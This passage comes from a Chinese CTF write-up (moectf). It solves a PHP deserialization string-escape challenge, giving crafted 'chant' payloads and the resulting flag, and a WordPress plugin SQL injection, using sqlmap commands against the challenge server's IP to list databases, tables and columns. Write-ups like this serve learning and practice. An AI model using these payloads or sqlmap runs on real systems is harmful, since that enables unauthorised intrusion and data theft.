class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;Hanxin.exe.php&#x27;</span>);<br><br><span class="hljs-variable">$Chant</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;chant&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;chant&#x27;</span>] : <span class="hljs-string">&#x27;å¤ºå‘½åä¸‰æª&#x27;</span>;<br><br><span class="hljs-variable">$new_visitor</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span>(<span class="hljs-variable">$Chant</span>);<br><br><span class="hljs-variable">$before</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$new_visitor</span>);<br><span class="hljs-variable">$after</span> = <span class="hljs-title class_">Deadly_Thirteen_Spears</span>::<span class="hljs-title function_ invoke__">Make_a_Move</span>(<span class="hljs-variable">$before</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your Movements: &#x27;</span> . <span class="hljs-variable">$after</span> . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><br><span class="hljs-keyword">try</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$after</span>);<br>&#125;<span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Even Caused A Glitch...&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>Your Movements: O:<span class="hljs-number">34</span>:<span class="hljs-string">&quot;Omg_It_Is_So_Cool_Bring_Me_My_Flag&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Chant&quot;</span>;s:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;å¤ºå‘½åä¸‰æª&quot;</span>;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;Spear_Owner&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Nobody&quot;</span>;&#125;<br>Far away <span class="hljs-keyword">from</span> COOL...<br></code></pre></td></tr></table></figure><p>è¿™é‡Œrequire_onceä¸­æœ‰ä¸€ä¸ªå¯è¿›å…¥çš„php<br>å…ˆä¸ç®¡ï¼Œå¾€ä¸‹çœ‹çœ‹åˆ°serializeå’Œunserializeï¼Œè¿™æ˜¯ä¸€ä¸ªååºåˆ—åŒ–ç±»å‹é¢˜<br>å†è¿›å…¥Hanxin.exe.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SCRIPT_FILENAME&#x27;</span>]) === <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-keyword">__FILE__</span>)) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Deadly_Thirteen_Spears</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$Top_Secret_Long_Spear_Techniques_Manual</span> = <span class="hljs-keyword">array</span>(<br>        <span class="hljs-string">&quot;di_yi_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Lovesickness&quot;</span>,<br>        <span class="hljs-string">&quot;di_er_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Heartbreak&quot;</span>,<br>        <span class="hljs-string">&quot;di_san_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Blind_Dragon&quot;</span>,<br>        <span class="hljs-string">&quot;di_si_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Romantic_charm&quot;</span>,<br>        <span class="hljs-string">&quot;di_wu_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Peerless&quot;</span>,<br>        <span class="hljs-string">&quot;di_liu_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;White_Dragon&quot;</span>,<br>        <span class="hljs-string">&quot;di_qi_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Penetrating_Gaze&quot;</span>,<br>        <span class="hljs-string">&quot;di_ba_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Kunpeng&quot;</span>,<br>        <span class="hljs-string">&quot;di_jiu_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Night_Parade_of_a_Hundred_Ghosts&quot;</span>,<br>        <span class="hljs-string">&quot;di_shi_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Overlord&quot;</span>,<br>        <span class="hljs-string">&quot;di_shi_yi_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Letting_Go&quot;</span>,<br>        <span class="hljs-string">&quot;di_shi_er_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Decisive_Victory&quot;</span>,<br>        <span class="hljs-string">&quot;di_shi_san_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Unrepentant_Lethality&quot;</span><br>    );<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Make_a_Move</span>(<span class="hljs-params"><span class="hljs-variable">$move</span></span>)</span>&#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable">$Top_Secret_Long_Spear_Techniques_Manual</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$index</span> =&gt; <span class="hljs-variable">$movement</span>)&#123;<br>            <span class="hljs-variable">$move</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$index</span>, <span class="hljs-variable">$movement</span>, <span class="hljs-variable">$move</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$move</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span></span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Chant</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Spear_Owner</span> = <span class="hljs-string">&#x27;Nobody&#x27;</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$chant</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;Chant = <span class="hljs-variable">$chant</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;Spear_Owner = <span class="hljs-string">&#x27;Nobody&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;Spear_Owner !== <span class="hljs-string">&#x27;MaoLei&#x27;</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Far away from COOL...&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Omg You&#x27;re So COOOOOL!!! &quot;</span> . <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&#x27;FLAG&#x27;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>é€šè¿‡ä»£ç å¯çŸ¥è¦è®©spear_Owner&#x3D;&#x3D;&#x3D;â€™Maoleiâ€™æ‰èƒ½å¾—åˆ°flag<br>è€Œè¿™ä¸ªå€¼ä¸ºnobodyï¼Œæˆ‘ä»¬ä¸å¯ä»¥ç›´æ¥æ”¹å˜ã€‚<br>å†çœ‹ä¸Šé¢çš„class</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable">$Top_Secret_Long_Spear_Techniques_Manual</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$index</span> =&gt; <span class="hljs-variable">$movement</span>)&#123;<br>           <span class="hljs-variable">$move</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$index</span>, <span class="hljs-variable">$movement</span>, <span class="hljs-variable">$move</span>);<br>       &#125;<br>       <span class="hljs-keyword">return</span> <span class="hljs-variable">$move</span>; <br></code></pre></td></tr></table></figure><p>foreach è¯­æ³•ç»“æ„æä¾›äº†éå†æ•°ç»„çš„ç®€å•æ–¹å¼ã€‚foreach å¾ªç¯åªé€‚ç”¨äºæ•°ç»„ï¼Œå¹¶ç”¨äºéå†æ•°ç»„ä¸­çš„æ¯ä¸ªé”®&#x2F;å€¼å¯¹.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$age</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;Bill&quot;</span>=&gt;<span class="hljs-string">&quot;63&quot;</span>,<span class="hljs-string">&quot;Steve&quot;</span>=&gt;<span class="hljs-string">&quot;56&quot;</span>,<span class="hljs-string">&quot;Elon&quot;</span>=&gt;<span class="hljs-string">&quot;47&quot;</span>);<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$age</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span>=&gt;<span class="hljs-variable">$x_value</span>) &#123;<br>   <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Key=&quot;</span> . <span class="hljs-variable">$x</span> . <span class="hljs-string">&quot;, Value=&quot;</span> . <span class="hljs-variable">$x_value</span>;<br>   <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;?<br>ç»“æœä¸ºï¼š<br>Key=Bill, Value=<span class="hljs-number">63</span><br>Key=Steve, Value=<span class="hljs-number">56</span><br>Key=Elon, Value=<span class="hljs-number">47</span><br></code></pre></td></tr></table></figure><p>æœ€é‡è¦çš„æ˜¯è¿™ä¸€è¯­å¥</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-symbol">$move</span> = str_replace(<span class="hljs-symbol">$i</span>ndex, <span class="hljs-symbol">$moveme</span>nt, <span class="hljs-symbol">$move</span>); <br></code></pre></td></tr></table></figure><p>çœ‹åˆ°str_replaceå’Œserializeå°±çŸ¥é“è¿™æ˜¯ä¸€ä¸ªååºåˆ—åŒ–å­—ç¬¦æº¢å‡ºæ¼æ´<br>æ¥ä¸‹æ¥ç€æ‰‹æ„é€ <br>æˆªå–åºåˆ—åŒ–å­—ç¬¦</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">34</span>:<span class="hljs-string">&quot;Omg_It_Is_So_Cool_Bring_Me_My_Flag&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Chant&quot;</span>;s:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;å¤ºå‘½åä¸‰æª&quot;</span>;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;Spear_Owner&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Nobody&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>æˆªå–<code>&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;Nobody&quot;;&#125;</code>ä¸º35å­—ç¬¦ï¼Œæˆ‘ä»¬è¦æŠŠè¿™35ä¸ªå­—ç¬¦æŒ¤å‡º<br>ç„¶åæ¢ä¸ºæˆ‘ä»¬éœ€è¦å®ƒçš„å€¼<code>&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;MaoLei&quot;;&#125;</code></p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs coq"><span class="hljs-string">&quot;di_yi_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Lovesickness&quot;</span>,<br><span class="hljs-string">&quot;di_er_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Heartbreak&quot;</span>,<br><span class="hljs-string">&quot;di_san_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Blind_Dragon&quot;</span>,<br><span class="hljs-string">&quot;di_si_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Romantic_charm&quot;</span>,<br><span class="hljs-string">&quot;di_wu_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Peerless&quot;</span>,<br><span class="hljs-string">&quot;di_liu_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;White_Dragon&quot;</span>,<br><span class="hljs-string">&quot;di_qi_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Penetrating_Gaze&quot;</span>,<br><span class="hljs-string">&quot;di_ba_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Kunpeng&quot;</span>,<br><span class="hljs-string">&quot;di_jiu_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Night_Parade_of_a_Hundred_Ghosts&quot;</span>,<br><span class="hljs-string">&quot;di_shi_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Overlord&quot;</span>,<br><span class="hljs-string">&quot;di_shi_yi_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Letting_Go&quot;</span>,<br><span class="hljs-string">&quot;di_shi_er_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Decisive_Victory&quot;</span>,<br><span class="hljs-string">&quot;di_shi_san_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Unrepentant_Lethality&quot;</span><br></code></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œé¢æ‰¾ä¸€ä¸ªå‰é¢æ¯”åé¢çŸ­çš„<br>ä»¥ç¬¬ä¸€æªï¼ï¼ä¸¾ä¾‹ï¼š<br>å‰æ¯”åå°‘ä¸€<br>é‚£ä¹ˆè¾“å‡º35éå‰æ‰èƒ½æŠŠ35å­—ç¬¦æŒ¤å‡º(æ³¨ï¼š35éåéœ€è¦æŠŠæˆ‘ä»¬æ”¹å˜çš„å€¼åŠ åœ¨åé¢)<br>payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?chant=di_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiang<span class="hljs-string">&quot;;s:11:&quot;</span>Spear_Owne<span class="hljs-string">r&quot;;s:6:&quot;</span>MaoLei<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">moectf</span><span class="hljs-template-variable">&#123;C00L_b0Y!_AsgCuAg60YxVeSqKZqV8kZK1n-t-IlAA&#125;</span><br></code></pre></td></tr></table></figure><p>ç¬¬ä¸ƒæªï¼ï¼<br>å‰æ¯”åå°‘5<br>è¾“å‡º7é<br>payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?chant=di_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiang<span class="hljs-string">&quot;;s:11:&quot;</span>Spear_Owne<span class="hljs-string">r&quot;;s:6:&quot;</span>MaoLei<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="web-â€“å‡ºå»æ—…æ¸¸çš„å¿ƒæµ·"><a href="#web-â€“å‡ºå»æ—…æ¸¸çš„å¿ƒæµ·" class="headerlink" title="web â€“å‡ºå»æ—…æ¸¸çš„å¿ƒæµ·"></a>web â€“å‡ºå»æ—…æ¸¸çš„å¿ƒæµ·</h2><p>è¿›å…¥wordpressï¼ŒF12æ‰¾åˆ°ä¸€ä¸ªphpæ–‡ä»¶<br><img src="/images/OZRAX25D5V1EYGX3LVE.png"><br>è¿›å…¥æ‰¾åˆ°æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">Plugin Name: Visitor auto recorder</span><br><span class="hljs-comment">Description: Automatically record visitor&#x27;s identification, still in development, do not use in industry environment!</span><br><span class="hljs-comment">Author: KoKoMi</span><br><span class="hljs-comment">  Still in development! :)</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">// ä¸è®¸å·çœ‹ï¼è¿™äº›ä»£ç æˆ‘è¿˜åœ¨è°ƒè¯•å‘¢ï¼</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-comment">// åŠ è½½æ•°æ®åº“é…ç½®ï¼Œæš‚æ—¶ç”¨ç¡¬ç¼–ç ç»å¯¹è·¯å¾„</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;/var/www/html/wordpress/&#x27;</span> . <span class="hljs-string">&#x27;wp-config.php&#x27;</span>);<br><br><span class="hljs-variable">$db_user</span> = DB_USER; <span class="hljs-comment">// æ•°æ®åº“ç”¨æˆ·å</span><br><span class="hljs-variable">$db_password</span> = DB_PASSWORD; <span class="hljs-comment">// æ•°æ®åº“å¯†ç </span><br><span class="hljs-variable">$db_name</span> = DB_NAME; <span class="hljs-comment">// æ•°æ®åº“åç§°</span><br><span class="hljs-variable">$db_host</span> = DB_HOST; <span class="hljs-comment">// æ•°æ®åº“ä¸»æœº</span><br><br><span class="hljs-comment">// æˆ‘è®°å¾—å¯ä»¥ç”¨wpæä¾›çš„global $wpdbæ¥æ“ä½œæ•°æ®åº“ï¼Œç­‰æ—…æ¸¸å›æ¥å†ç ”ç©¶ä¸€ä¸‹</span><br><span class="hljs-comment">// è¿™äº›æ˜¯ä¸´æ—¶çš„ä»£ç </span><br><br><span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br><span class="hljs-variable">$user_agent</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;user_agent&#x27;</span>];<br><span class="hljs-variable">$time</span> = <span class="hljs-title function_ invoke__">stripslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;time&#x27;</span>]);<br><br><span class="hljs-variable">$mysqli</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-variable">$db_host</span>, <span class="hljs-variable">$db_user</span>, <span class="hljs-variable">$db_password</span>, <span class="hljs-variable">$db_name</span>);<br><br><span class="hljs-comment">// æ£€æŸ¥è¿æ¥æ˜¯å¦æˆåŠŸ</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$mysqli</span>-&gt;connect_errno) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;æ•°æ®åº“è¿æ¥å¤±è´¥: &#x27;</span> . <span class="hljs-variable">$mysqli</span>-&gt;connect_error;<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;INSERT INTO visitor_records (ip, user_agent, time) VALUES (&#x27;<span class="hljs-subst">$ip</span>&#x27;, &#x27;<span class="hljs-subst">$user_agent</span>&#x27;, <span class="hljs-subst">$time</span>)&quot;</span>;<br><br><span class="hljs-comment">// æ‰§è¡Œæ’å…¥</span><br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$mysqli</span>, <span class="hljs-variable">$query</span>);<br><br><span class="hljs-comment">// æ£€æŸ¥æ’å…¥æ˜¯å¦æˆåŠŸ</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;æ•°æ®æ’å…¥æˆåŠŸ&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;æ•°æ®æ’å…¥å¤±è´¥: &#x27;</span> . <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$mysqli</span>);<br>&#125;<br><br><span class="hljs-comment">// å…³é—­æ•°æ®åº“è¿æ¥</span><br><span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$mysqli</span>);<br></code></pre></td></tr></table></figure><p>å…ˆé™„ä¸Šä¸€ä¸ª<a href="https://blog.csdn.net/smli_ng/article/details/106026901">sqlmapä½¿ç”¨æ–¹æ³•</a><br>æ ¹æ®æœ«å°¾æç¤ºæµ‹è¯•å‘ç°timeå­˜åœ¨æŠ¥é”™æ³¨å…¥ï¼Œä½¿ç”¨sqlmap</p><p><strong>æŸ¥çœ‹æ•°æ®åº“</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php&quot;</span> <span class="hljs-attr">--data</span> <span class="hljs-string">&quot;time=1&quot;</span> <span class="hljs-attr">--dbs</span> <span class="hljs-attr">--batch</span><br></code></pre></td></tr></table></figure><p>â€“dataï¼šé€šè¿‡POSTæäº¤æ•°æ®<br>â€“dbsï¼šæšä¸¾DBMSæ‰€æœ‰çš„æ•°æ®åº“<br>â€“batchï¼šæµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œ æ‰§è¡Œæ‰€æœ‰é»˜è®¤é…ç½®</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs inform7">available databases <span class="hljs-comment">[3]</span>:<br><span class="hljs-comment">[*]</span> information_schema<br><span class="hljs-comment">[*]</span> performance_schema<br><span class="hljs-comment">[*]</span> wordpress<br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹æ•°æ®åº“é‡Œé¢çš„è¡¨</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php&quot;</span> <span class="hljs-attr">--data</span> <span class="hljs-string">&quot;time=1&quot;</span> -D wordpress <span class="hljs-attr">--tables</span> <span class="hljs-attr">--batch</span><br></code></pre></td></tr></table></figure><p>â€“tables:æšä¸¾DBMSæ•°æ®åº“ä¸­æ‰€æœ‰çš„è¡¨</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">+-----------------------+<br>|<span class="hljs-string"> secret_of_kokomi      </span>|<br>|<span class="hljs-string"> visitor_records       </span>|<br>|<span class="hljs-string"> wp_commentmeta        </span>|<br>|<span class="hljs-string"> wp_comments           </span>|<br>|<span class="hljs-string"> wp_e_events           </span>|<br>|<span class="hljs-string"> wp_links              </span>|<br>|<span class="hljs-string"> wp_options            </span>|<br>|<span class="hljs-string"> wp_postmeta           </span>|<br>|<span class="hljs-string"> wp_posts              </span>|<br>|<span class="hljs-string"> wp_snippets           </span>|<br>|<span class="hljs-string"> wp_term_relationships </span>|<br>|<span class="hljs-string"> wp_term_taxonomy      </span>|<br>|<span class="hljs-string"> wp_termmeta           </span>|<br>|<span class="hljs-string"> wp_terms              </span>|<br>|<span class="hljs-string"> wp_usermeta           </span>|<br>|<span class="hljs-string"> wp_users              </span>|<br>+-----------------------+<br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹æ•°æ®åº“è¡¨é‡Œçš„åˆ—</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php&quot;</span> <span class="hljs-attr">--data</span> <span class="hljs-string">&quot;time=1&quot;</span> -D wordpress -T secret_of_kokomi <span class="hljs-attr">--columns</span><br></code></pre></td></tr></table></figure><p>â€“columns :æšä¸¾DBMSæ•°æ®åº“è¡¨ä¸­æ‰€æœ‰çš„åˆ—</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">+---------+</span>------+<br><span class="hljs-section">| Column  | Type |</span><br><span class="hljs-section">+---------+------+</span><br>| content | text |<br><span class="hljs-section">| id      | int  |</span><br><span class="hljs-section">+---------+------+</span><br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹æ•°æ®åº“åˆ—é‡Œé¢çš„å…·ä½“çš„å€¼</strong></p><figure class="highlight 